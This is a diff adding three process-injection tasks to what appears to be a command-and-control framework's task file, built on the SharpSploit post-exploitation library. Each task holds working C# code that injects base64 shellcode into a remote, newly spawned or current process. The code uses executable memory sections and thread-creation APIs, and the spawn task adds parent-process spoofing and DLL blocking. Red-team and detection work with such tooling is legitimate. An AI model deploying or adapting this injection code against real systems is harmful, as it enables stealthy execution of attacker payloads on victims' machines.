@@ -1053,3 +1053,405 @@
     EmbeddedResources: []
   ReferenceAssemblies: []
   EmbeddedResources: []
+- Name: ProcessInjectionRemote
+  Aliases: []
+  Author:
+    Name: Simone Salucci & Daniel López
+    Handle: '@saim1z @attl4s'
+    Link: ''
+  Description: Injects and executes the specified Positional Independent Code into the process specified by the ProcessID parameter using one of the available techniques.
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: "using System;\nusing System.Diagnostics;\nusing SharpSploit.Execution;\nusing SharpSploit.Execution.Injection;\n\npublic static class Task\n{\n	public static string Execute(string ExecutionTechnique, string ProcessID, string PICpayload)\n	{\n		string output = \"\";\n		RemoteThreadCreate.APIS apiTechnique;\n\n		if (ExecutionTechnique == \"CreateRemoteThread\") {apiTechnique = RemoteThreadCreate.APIS.CreateRemoteThread;}\n		else if (ExecutionTechnique == \"NtCreateThreadEx\") {apiTechnique = RemoteThreadCreate.APIS.NtCreateThreadEx;}\n		else if (ExecutionTechnique == \"RtlCreateUserThread\") {apiTechnique = RemoteThreadCreate.APIS.RtlCreateUserThread;}\n		else if (ExecutionTechnique == \"\" || ExecutionTechnique == \"\\\"\")\n		{\n			apiTechnique = RemoteThreadCreate.APIS.CreateRemoteThread;\n			output += \"No technique passed as argument. CreateRemoteThread technique was used\\n\";\n		}\n		else\n        {\n			output += \"Injection technique \" + ExecutionTechnique + \" is not implemented. Choose one of the following values:\\n\" +\n				\"CreateRemoteThread\\n\" +\n				\"NtCreateThreadEx\\n\" +\n				\"RtlCreateUserThread\\n\";\n			return output;\n		}\n                \n		try\n		{	\n        	if (ProcessID == \"\" || ProcessID == \"\\\"\")\n            {\n            	output += \"No ProcessID passed as argument. Please specify a valid ProcessID\";\n            }\n        	\n        	int ProcID = Int32.Parse(ProcessID);	\n			Process proc = Process.GetProcessById(ProcID);\n            \n			RemoteThreadCreate injectionTechnique = new RemoteThreadCreate\n			{\n				api = apiTechnique,\n				suspended = false\n			};\n			\n            SectionMapAlloc allocationTechnique = new SectionMapAlloc\n			{\n				localSectionPermissions = Win32.WinNT.PAGE_READWRITE,\n				remoteSectionPermissions = Win32.WinNT.PAGE_EXECUTE_READWRITE,\n				sectionAttributes = Win32.WinNT.SEC_COMMIT\n			};\n\n			PICPayload payload = new PICPayload(Convert.FromBase64String(PICpayload));\n            Injector.Inject(payload, allocationTechnique, injectionTechnique, proc);\n            \n			output += \"Attempting to inject the provided shellcode into process \" + proc.ProcessName + \" with PID \" + ProcID;\n			return output;\n		}\n		catch (Exception e) { return e.GetType().FullName + \": \" + e.Message + Environment.NewLine + e.StackTrace; }\n		return output;\n	}\n}"
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: ExecutionTechnique
+    Value: ''
+    DefaultValue: CreateRemoteThread
+    Description: The technique used to execute the specified Positional Independent Code.
+    SuggestedValues:
+    - CreateRemoteThread
+    - NtCreateThreadEx
+    - RtlCreateUserThread
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  - Name: ProcessID
+    Value: ''
+    DefaultValue: ''
+    Description: Process ID of the process to impersonate.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: PICpayload
+    Value: ''
+    DefaultValue: ''
+    Description: Positional Independent Code to inject into the target process.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: false
+    FileOption: true
+  ReferenceSourceLibraries:
+  - Name: SharpSploit
+    Description: SharpSploit is a library for C# post-exploitation modules.
+    Location: SharpSploit\SharpSploit\
+    Language: CSharp
+    CompatibleDotNetVersions:
+    - Net35
+    - Net40
+    ReferenceAssemblies:
+    - Name: System.Core.dll
+      Location: net40\System.Core.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net40\System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net40\System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40\System.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net40\System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.Management.Automation.dll
+      Location: net40\System.Management.Automation.dll
+      DotNetVersion: Net40
+    - Name: System.Management.dll
+      Location: net40\System.Management.dll
+      DotNetVersion: Net40
+    - Name: System.ServiceProcess.dll
+      Location: net40\System.ServiceProcess.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40\mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net35\System.XML.dll
+      DotNetVersion: Net35
+    - Name: System.Windows.Forms.dll
+      Location: net35\System.Windows.Forms.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35\System.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net35\System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.dll
+      Location: net35\System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35\System.Core.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net35\mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.IdentityModel.dll
+      Location: net35\System.IdentityModel.dll
+      DotNetVersion: Net35
+    - Name: System.Management.Automation.dll
+      Location: net35\System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net35\System.Management.dll
+      DotNetVersion: Net35
+    - Name: System.ServiceProcess.dll
+      Location: net35\System.ServiceProcess.dll
+      DotNetVersion: Net35
+    - Name: System.Windows.Forms.dll
+      Location: net40\System.Windows.Forms.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net40\System.XML.dll
+      DotNetVersion: Net40
+    EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
+- Name: ProcessInjectionSpawn
+  Aliases: []
+  Author:
+    Name: Simone Salucci & Daniel López
+    Handle: '@saim1z @attl4s'
+    Link: ''
+  Description: Creates a new process using the createProcess Win32 API call through PInvoke and injects and executes the specified Positional Independent Code using one of the available techniques. Supports Parent Process Spoofing (PPID) and the BlockDLL attribute.
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: "using System;\nusing System.Diagnostics;\nusing SharpSploit.Execution;\nusing SharpSploit.Execution.Injection;\n\npublic static class Task\n{\n	public static string Execute(string ExecutionTechnique, string Binary, string PICpayload, string ParentPID, string BlockDLL)\n	{\n		string output = \"\";\n		RemoteThreadCreate.APIS apiTechnique;\n		\n		if (ExecutionTechnique == \"CreateRemoteThread\") {apiTechnique = RemoteThreadCreate.APIS.CreateRemoteThread;}\n		else if (ExecutionTechnique == \"NtCreateThreadEx\") {apiTechnique = RemoteThreadCreate.APIS.NtCreateThreadEx;}\n		else if (ExecutionTechnique == \"RtlCreateUserThread\") {apiTechnique = RemoteThreadCreate.APIS.RtlCreateUserThread;}  \n        else if (ExecutionTechnique == \"\" || ExecutionTechnique == \"\\\"\")\n		{\n			apiTechnique = RemoteThreadCreate.APIS.CreateRemoteThread;\n			output += \"No technique passed as argument. CreateRemoteThread technique was used\\n\";\n		}\n		else\n        {\n			output += \"Injection technique \" + ExecutionTechnique + \" is not implemented. Choose one of the following values:\\n\" +\n				\"CreateRemoteThread\\n\" +\n				\"NtCreateThreadEx\\n\" +\n				\"RtlCreateUserThread\\n\";\n			return output;\n		}\n        \n		try\n		{	\n        	bool BlockDLLb = (BlockDLL.ToLower() == \"true\" ? true : false);\n        	\n        	int ProcID;\n        	if (ParentPID == \"\" || ParentPID == \"\\\"\")\n            {\n            	ProcID = (int)Shell.CreateProcessPInvoke(Binary,BlockDLLb).dwProcessId;\n            }\n            else\n            {\n            	int PPID = Int32.Parse(ParentPID);\n			    ProcID = (int)Shell.CreateProcessPInvokePPID(Binary,PPID,BlockDLLb).dwProcessId;\n            }\n        	     	\n			Process proc = Process.GetProcessById(ProcID);\n			RemoteThreadCreate injectionTechnique = new RemoteThreadCreate\n			{\n				api = apiTechnique,\n				suspended = false\n			};\n			SectionMapAlloc allocationTechnique = new SectionMapAlloc\n			{\n				localSectionPermissions = Win32.WinNT.PAGE_READWRITE,\n				remoteSectionPermissions = Win32.WinNT.PAGE_EXECUTE_READWRITE,\n				sectionAttributes = Win32.WinNT.SEC_COMMIT\n			};\n\n			PICPayload payload = new PICPayload(Convert.FromBase64String(PICpayload));\n			Injector.Inject(payload, allocationTechnique, injectionTechnique, proc);\n			\n			output += \"Attempting to inject the provided shellcode into process \" + proc.ProcessName;\n			return output;\n		}\n		catch (Exception e) { return e.GetType().FullName + \": \" + e.Message + Environment.NewLine + e.StackTrace; }\n		return output;\n	}\n}\n\n"
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: ExecutionTechnique
+    Value: ''
+    DefaultValue: CreateRemoteThread
+    Description: Injection technique.
+    SuggestedValues:
+    - CreateRemoteThread
+    - NtCreateThreadEx
+    - RtlCreateUserThread
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Binary
+    Value: ''
+    DefaultValue: ''
+    Description: Full path of the new process to spawn (e.g. C:\windows\system32\notepad.exe).
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: PICpayload
+    Value: ''
+    DefaultValue: ''
+    Description: Positional Independent Code to inject in the target process.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: false
+    FileOption: true
+  - Name: ParentPID
+    Value: ''
+    DefaultValue: ''
+    Description: PID of the parent process to spoof.
+    SuggestedValues: []
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  - Name: BlockDLL
+    Value: ''
+    DefaultValue: False
+    Description: Boolean, whether to use BlockDDL.
+    SuggestedValues: []
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries:
+  - Name: SharpSploit
+    Description: SharpSploit is a library for C# post-exploitation modules.
+    Location: SharpSploit\SharpSploit\
+    Language: CSharp
+    CompatibleDotNetVersions:
+    - Net35
+    - Net40
+    ReferenceAssemblies:
+    - Name: System.Core.dll
+      Location: net40\System.Core.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net40\System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net40\System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40\System.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net40\System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.Management.Automation.dll
+      Location: net40\System.Management.Automation.dll
+      DotNetVersion: Net40
+    - Name: System.Management.dll
+      Location: net40\System.Management.dll
+      DotNetVersion: Net40
+    - Name: System.ServiceProcess.dll
+      Location: net40\System.ServiceProcess.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40\mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net35\System.XML.dll
+      DotNetVersion: Net35
+    - Name: System.Windows.Forms.dll
+      Location: net35\System.Windows.Forms.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35\System.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net35\System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.dll
+      Location: net35\System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35\System.Core.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net35\mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.IdentityModel.dll
+      Location: net35\System.IdentityModel.dll
+      DotNetVersion: Net35
+    - Name: System.Management.Automation.dll
+      Location: net35\System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net35\System.Management.dll
+      DotNetVersion: Net35
+    - Name: System.ServiceProcess.dll
+      Location: net35\System.ServiceProcess.dll
+      DotNetVersion: Net35
+    - Name: System.Windows.Forms.dll
+      Location: net40\System.Windows.Forms.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net40\System.XML.dll
+      DotNetVersion: Net40
+    EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
+- Name: ProcessInjectionLocal
+  Aliases: []
+  Author:
+    Name: Simone Salucci & Daniel López
+    Handle: '@saim1z @attl4s'
+    Link: ''
+  Description: Injects and executes the specified Positional Independent Code into the current process.
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: >-
+    using System;
+
+    using System.Diagnostics;
+
+    using System.Runtime.InteropServices;
+
+    using SharpSploit.Execution;
+
+    using SharpSploit.Execution.Injection;
+
+
+    public static class Task
+
+    {
+        [UnmanagedFunctionPointerAttribute(CallingConvention.Cdecl)]
+        private delegate Int32 Run();
+    	
+        public static string Execute(string PICpayload)
+      	{	
+        	try
+        	{
+            	Process proc = Process.GetCurrentProcess();
+          		SectionMapAlloc allocationTechnique = new SectionMapAlloc
+          		{	
+            		localSectionPermissions = Win32.WinNT.PAGE_READWRITE,
+            		remoteSectionPermissions = Win32.WinNT.PAGE_EXECUTE_READWRITE,
+            		sectionAttributes = Win32.WinNT.SEC_COMMIT
+          		};
+
+          		PICPayload payload = new PICPayload(Convert.FromBase64String(PICpayload));
+                IntPtr baseAddr = allocationTechnique.Allocate(payload, proc);
+                Run del = (Run)Marshal.GetDelegateForFunctionPointer(baseAddr, typeof(Run));
+                del();
+          		return "ShellCode execution succeeded.";
+        	}
+        	catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
+       		return "ShellCode execution failed.";
+      	}
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: PICpayload
+    Value: ''
+    DefaultValue: ''
+    Description: Positional Independent Code to inject into the current process.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: false
+    FileOption: true
+  ReferenceSourceLibraries:
+  - Name: SharpSploit
+    Description: SharpSploit is a library for C# post-exploitation modules.
+    Location: SharpSploit\SharpSploit\
+    Language: CSharp
+    CompatibleDotNetVersions:
+    - Net35
+    - Net40
+    ReferenceAssemblies:
+    - Name: System.Core.dll
+      Location: net40\System.Core.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net40\System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net40\System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40\System.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net40\System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.Management.Automation.dll
+      Location: net40\System.Management.Automation.dll
+      DotNetVersion: Net40
+    - Name: System.Management.dll
+      Location: net40\System.Management.dll
+      DotNetVersion: Net40
+    - Name: System.ServiceProcess.dll
+      Location: net40\System.ServiceProcess.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40\mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net35\System.XML.dll
+      DotNetVersion: Net35
+    - Name: System.Windows.Forms.dll
+      Location: net35\System.Windows.Forms.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35\System.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net35\System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.dll
+      Location: net35\System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35\System.Core.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net35\mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.IdentityModel.dll
+      Location: net35\System.IdentityModel.dll
+      DotNetVersion: Net35
+    - Name: System.Management.Automation.dll
+      Location: net35\System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net35\System.Management.dll
+      DotNetVersion: Net35
+    - Name: System.ServiceProcess.dll
+      Location: net35\System.ServiceProcess.dll
+      DotNetVersion: Net35
+    - Name: System.Windows.Forms.dll
+      Location: net40\System.Windows.Forms.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net40\System.XML.dll
+      DotNetVersion: Net40
+    EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
